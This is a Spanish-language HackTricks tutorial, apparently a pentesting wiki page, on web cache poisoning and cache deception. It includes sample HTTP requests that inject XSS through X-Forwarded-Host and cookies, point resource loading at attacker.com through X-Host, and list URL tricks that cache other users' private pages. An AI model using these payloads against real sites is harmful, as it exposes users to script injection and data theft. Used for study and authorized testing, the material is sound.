# Envenenamiento de Cach√© y Enga√±o de Cach√©

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias **m√°s avanzadas** del mundo.\
¬°Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## La diferencia

> **¬øCu√°l es la diferencia entre el envenenamiento de cach√© web y el enga√±o de cach√© web?**
>
> * En el **envenenamiento de cach√© web**, el atacante hace que la aplicaci√≥n almacene alg√∫n contenido malicioso en la cach√©, y este contenido se sirve desde la cach√© a otros usuarios de la aplicaci√≥n.
> * En el **enga√±o de cach√© web**, el atacante hace que la aplicaci√≥n almacene alg√∫n contenido sensible perteneciente a otro usuario en la cach√©, y luego el atacante recupera este contenido de la cach√©.

## Envenenamiento de Cach√©

El envenenamiento de cach√© tiene como objetivo manipular la cach√© del lado del cliente para forzar a los clientes a cargar recursos que son inesperados, parciales o est√°n bajo el control de un atacante. La magnitud del impacto depende de la popularidad de la p√°gina afectada, ya que la respuesta contaminada se sirve exclusivamente a los usuarios que visitan la p√°gina durante el per√≠odo de contaminaci√≥n de la cach√©.

La ejecuci√≥n de un ataque de envenenamiento de cach√© implica varios pasos:

1. **Identificaci√≥n de Entradas sin Clave**: Estos son par√°metros que, aunque no son necesarios para que se almacene una solicitud en la cach√©, pueden alterar la respuesta devuelta por el servidor. Identificar estas entradas es crucial, ya que pueden ser explotadas para manipular la cach√©.
2. **Explotaci√≥n de las Entradas sin Clave**: Despu√©s de identificar las entradas sin clave, el siguiente paso implica descubrir c√≥mo abusar de estos par√°metros para modificar la respuesta del servidor de una manera que beneficie al atacante.
3. **Asegurar que la Respuesta Envenenada se Almacene en la Cach√©**: El paso final es asegurar que la respuesta manipulada se almacene en la cach√©. De esta manera, cualquier usuario que acceda a la p√°gina afectada mientras la cach√© est√© envenenada recibir√° la respuesta contaminada.

### Descubrimiento: Verificar encabezados HTTP

Por lo general, cuando una respuesta fue **almacenada en la cach√©** habr√° un **encabezado que lo indique**, puedes verificar a qu√© encabezados debes prestar atenci√≥n en este post: [**Encabezados de Cach√© HTTP**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers).

### Descubrimiento: Almacenamiento de c√≥digo 400 en cach√©

Si piensas que la respuesta se est√° almacenando en una cach√©, podr√≠as intentar **enviar solicitudes con un encabezado incorrecto**, que deber√≠a recibir una **c√≥digo de estado 400** como respuesta. Luego intenta acceder a la solicitud de forma normal y si la **respuesta es un c√≥digo de estado 400**, sabr√°s que es vulnerable (e incluso podr√≠as realizar un DoS).\
Un encabezado mal configurado podr√≠a ser simplemente `\:` como encabezado.\
_Ten en cuenta que a veces este tipo de c√≥digos de estado no se almacenan en cach√©, por lo que esta prueba ser√° in√∫til._

### Descubrimiento: Identificar y evaluar entradas sin clave

Podr√≠as utilizar [**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) para **bruteforcear par√°metros y encabezados** que podr√≠an estar **cambiando la respuesta de la p√°gina**. Por ejemplo, una p√°gina podr√≠a estar usando el encabezado `X-Forwarded-For` para indicar al cliente que cargue el script desde all√≠:
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### Provocar una respuesta da√±ina desde el servidor back-end

Con el par√°metro/cabecera identificado, verifica c√≥mo est√° siendo **sanitizado** y **d√≥nde** se est√° **reflejando** o afectando la respuesta desde la cabecera. ¬øPuedes abusar de alguna manera (realizar un XSS o cargar un c√≥digo JS controlado por ti? ¬ørealizar un DoS?...)

### Obtener la respuesta en cach√©

Una vez que hayas **identificado** la **p√°gina** que puede ser abusada, qu√© **par√°metro**/**cabecera** usar y **c√≥mo** abusar de ella, necesitas que la p√°gina se almacene en cach√©. Dependiendo del recurso que est√©s intentando almacenar en cach√©, esto podr√≠a llevar algo de tiempo, es posible que necesites intentarlo durante varios segundos.\
La cabecera **`X-Cache`** en la respuesta puede ser muy √∫til, ya que puede tener el valor **`miss`** cuando la solicitud no estaba en cach√© y el valor **`hit`** cuando est√° en cach√©.\
La cabecera **`Cache-Control`** tambi√©n es interesante para saber si un recurso est√° en cach√© y cu√°ndo ser√° la pr√≥xima vez que se almacene en cach√© nuevamente: `Cache-Control: public, max-age=1800`\
Otra cabecera interesante es **`Vary`**. Esta cabecera se usa a menudo para **indicar cabeceras adicionales** que se tratan como **parte de la clave de cach√©** incluso si normalmente no tienen clave. Por lo tanto, si el usuario conoce el `User-Agent` de la v√≠ctima a la que apunta, puede envenenar la cach√© para los usuarios que utilizan ese `User-Agent` espec√≠fico.\
Otra cabecera relacionada con la cach√© es **`Age`**. Define el tiempo en segundos que el objeto ha estado en la cach√© del proxy.

Al almacenar en cach√© una solicitud, ten **cuidado con las cabeceras que uses** porque algunas de ellas podr√≠an ser **utilizadas inesperadamente** como **clave** y la **v√≠ctima necesitar√° usar esa misma cabecera**. Siempre **prueba** un Envenenamiento de Cach√© con **diferentes navegadores** para verificar si est√° funcionando.

## Ejemplos de Explotaci√≥n

### Ejemplo m√°s sencillo

Una cabecera como `X-Forwarded-For` se est√° reflejando en la respuesta sin ser sanitizada.\
Puedes enviar una carga √∫til b√°sica de XSS y envenenar la cach√© para que todos los que accedan a la p√°gina sean afectados por XSS:
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
_Nota que esto envenenar√° una solicitud a `/en?region=uk` y no a `/en`_

### Usar envenenamiento de cach√© web para explotar vulnerabilidades en el manejo de cookies

Las cookies tambi√©n podr√≠an reflejarse en la respuesta de una p√°gina. Si puedes abusar de esto para causar un XSS, por ejemplo, podr√≠as ser capaz de explotar XSS en varios clientes que carguen la respuesta de cach√© maliciosa.
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
### Envenenamiento de cach√© con traversal de ruta para robar clave de API <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**Este informe explica**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) c√≥mo fue posible robar una clave de API de OpenAI con una URL como `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` porque cualquier cosa que coincida con `/share/*` se almacenar√° en cach√© sin que Cloudflare normalice la URL, lo cual se hizo cuando la solicitud lleg√≥ al servidor web.

### Uso de m√∫ltiples encabezados para explotar vulnerabilidades de envenenamiento de cach√© web <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

A veces necesitar√°s **explotar varios inputs sin clave** para poder abusar de una cach√©. Por ejemplo, puedes encontrar una **redirecci√≥n abierta** si configuras `X-Forwarded-Host` a un dominio controlado por ti y `X-Forwarded-Scheme` a `http`. **Si** el **servidor** est√° **redirigiendo** todas las **solicitudes HTTP** a HTTPS y utilizando el encabezado `X-Forwarded-Scheme` como el nombre de dominio para la redirecci√≥n. Puedes controlar hacia d√≥nde apunta la p√°gina con la redirecci√≥n.
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### Explotando con el encabezado `Vary` limitado

Si descubres que el encabezado **`X-Host`** se est√° utilizando como **nombre de dominio para cargar un recurso JS** pero el encabezado **`Vary`** en la respuesta indica **`User-Agent`**. Entonces, necesitas encontrar una forma de extraer el User-Agent de la v√≠ctima y envenenar la cach√© utilizando ese user agent:
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### Explotando el Envenenamiento de Cach√© HTTP abusando del Contrabando de Solicitudes HTTP

Aprende aqu√≠ c√≥mo realizar [ataques de Envenenamiento de Cach√© abusando del Contrabando de Solicitudes HTTP](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning).

### Pruebas automatizadas para Envenenamiento de Cach√© Web

El [Esc√°ner de Vulnerabilidades de Cach√© Web](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner) se puede utilizar para probar autom√°ticamente el envenenamiento de cach√© web. Admite muchas t√©cnicas diferentes y es altamente personalizable.

Ejemplo de uso: `wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
¬°Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Ejemplos Vulnerables

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS reenviaba el fragmento dentro de la URL sin eliminarlo y generaba la clave de cach√© solo usando el host, la ruta y la consulta (ignorando el fragmento). Por lo tanto, la solicitud `/#/../?r=javascript:alert(1)` se enviaba al backend como `/#/../?r=javascript:alert(1)` y la clave de cach√© no conten√≠a la carga √∫til en su interior, solo el host, la ruta y la consulta.

### GitHub CP-DoS

Enviar un valor incorrecto en el encabezado de tipo de contenido desencadenaba una respuesta en cach√© 405. La clave de cach√© conten√≠a la cookie, por lo que solo era posible atacar a usuarios no autenticados.

### GitLab + GCP CP-DoS

GitLab utiliza buckets de GCP para almacenar contenido est√°tico. Los **buckets de GCP** admiten el encabezado `x-http-method-override`. Por lo tanto, era posible enviar el encabezado `x-http-method-override: HEAD` y envenenar la cach√© para devolver un cuerpo de respuesta vac√≠o. Tambi√©n podr√≠a admitir el m√©todo `PURGE`.

### Middleware de Rack (Ruby on Rails)

En las aplicaciones de Ruby on Rails, a menudo se utiliza el middleware de Rack. El prop√≥sito del c√≥digo de Rack es tomar el valor del encabezado **`x-forwarded-scheme`** y establecerlo como el esquema de la solicitud. Cuando se env√≠a el encabezado `x-forwarded-scheme: http`, se produce una redirecci√≥n 301 a la misma ubicaci√≥n, lo que potencialmente puede causar una Denegaci√≥n de Servicio (DoS) a ese recurso. Adem√°s, la aplicaci√≥n podr√≠a reconocer el encabezado `X-forwarded-host` y redirigir a los usuarios al host especificado. Este comportamiento puede llevar a la carga de archivos JavaScript desde el servidor de un atacante, lo que representa un riesgo de seguridad.

### 403 y Buckets de Almacenamiento

Cloudflare anteriormente almacenaba en cach√© respuestas 403. Intentar acceder a S3 o Azure Storage Blobs con encabezados de autorizaci√≥n incorrectos resultar√≠a en una respuesta 403 que se almacenaba en cach√©. Aunque Cloudflare ha dejado de almacenar en cach√© respuestas 403, este comportamiento a√∫n podr√≠a estar presente en otros servicios de proxy.

### Inyectando Par√°metros Clave

Las cach√©s a menudo incluyen par√°metros GET espec√≠ficos en la clave de cach√©. Por ejemplo, Varnish de Fastly almacenaba en cach√© el par√°metro `size` en las solicitudes. Sin embargo, si se enviaba tambi√©n una versi√≥n codificada en URL del par√°metro (por ejemplo, `siz%65`) con un valor err√≥neo, la clave de cach√© se construir√≠a utilizando el par√°metro `size` correcto. Sin embargo, el backend procesar√≠a el valor en el par√°metro codificado en URL. Codificar en URL el segundo par√°metro `size` llevaba a su omisi√≥n por la cach√© pero su utilizaci√≥n por el backend. Asignar un valor de 0 a este par√°metro resultaba en un error 400 Bad Request en cach√©.

### Reglas de Agente de Usuario

Algunos desarrolladores bloquean solicitudes con agentes de usuario que coinciden con los de herramientas de alto tr√°fico como FFUF o Nuclei para gestionar la carga del servidor. Ir√≥nicamente, este enfoque puede introducir vulnerabilidades como el envenenamiento de cach√© y DoS.

### Campos de Encabezado Ilegales

El [RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) especifica los caracteres aceptables en los nombres de encabezado. Los encabezados que contienen caracteres fuera del rango especificado de **tchar** deber√≠an idealmente desencadenar una respuesta 400 Bad Request. En la pr√°ctica, los servidores no siempre se adhieren a este est√°ndar. Un ejemplo notable es Akamai, que reenv√≠a encabezados con caracteres no v√°lidos y almacena cualquier error 400, siempre que el encabezado `cache-control` no est√© presente. Se identific√≥ un patr√≥n explotable donde el env√≠o de un encabezado con un car√°cter no v√°lido, como `\`, resultar√≠a en un error 400 Bad Request en cach√©.

### Encontrar nuevos encabezados

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## Enga√±o de Cach√©

El objetivo del Enga√±o de Cach√© es hacer que los clientes **carguen recursos que van a ser guardados por la cach√© con su informaci√≥n sensible**.

En primer lugar, ten en cuenta que las **extensiones** como `.css`, `.js`, `.png`, etc., suelen estar **configuradas** para ser **guardadas** en la **cach√©**. Por lo tanto, si accedes a `www.example.com/profile.php/nonexistent.js`, es probable que la cach√© almacene la respuesta porque ve la extensi√≥n `.js`. Sin embargo, si la **aplicaci√≥n** est√° **reproduciendo** con el **contenido sensible** del usuario almacenado en _www.example.com/profile.php_, puedes **robar** ese contenido de otros usuarios.

Otras cosas para probar:

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _Usar extensiones menos conocidas como_ `.avif`

Un ejemplo muy claro se puede encontrar en este informe: [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712).\
En el ejemplo, se explica que si cargas una p√°gina inexistente como _http://www.example.com/home.php/non-existent.css_, el contenido de _http://www.example.com/home.php_ (**con la informaci√≥n sensible del usuario**) se devolver√° y el servidor de cach√© guardar√° el resultado.\
Luego, el **atacante** puede acceder a _http://www.example.com/home.php/non-existent.css_ en su propio navegador y observar la **informaci√≥n confidencial** de los usuarios que accedieron antes.

Ten en cuenta que el **proxy de cach√©** debe estar **configurado** para **cachear** archivos **basados** en la **extensi√≥n** del archivo (_.css_) y no en el tipo de contenido. En el ejemplo _http://www.example.com/home.php/non-existent.css_ tendr√° un tipo de contenido `text/html` en lugar de un tipo MIME `text/css` (que es el esperado para un archivo _.css_).

Aprende aqu√≠ c√≥mo realizar [ataques de Enga√±o de Cach√© abusando del Contrabando de Solicitudes HTTP](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception).

## Referencias

* [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
* [https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities](https://portswigger.net/web-security/web-cache-poisoning/exploiting#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
* [https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)
* [https://youst.in/posts/cache-poisoning-at-scale/](https://youst.in/posts/cache-poisoning-at-scale/)
* [https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9](https://bxmbn.medium.com/how-i-test-for-web-cache-vulnerabilities-tips-and-tricks-9b138da08ff9)
* [https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/](https://www.linkedin.com/pulse/how-i-hacked-all-zendesk-sites-265000-site-one-line-abdalhfaz/)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f√°cilmente con las herramientas comunitarias m√°s avanzadas del mundo.\
¬°Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>
<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de HackTricks AWS)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
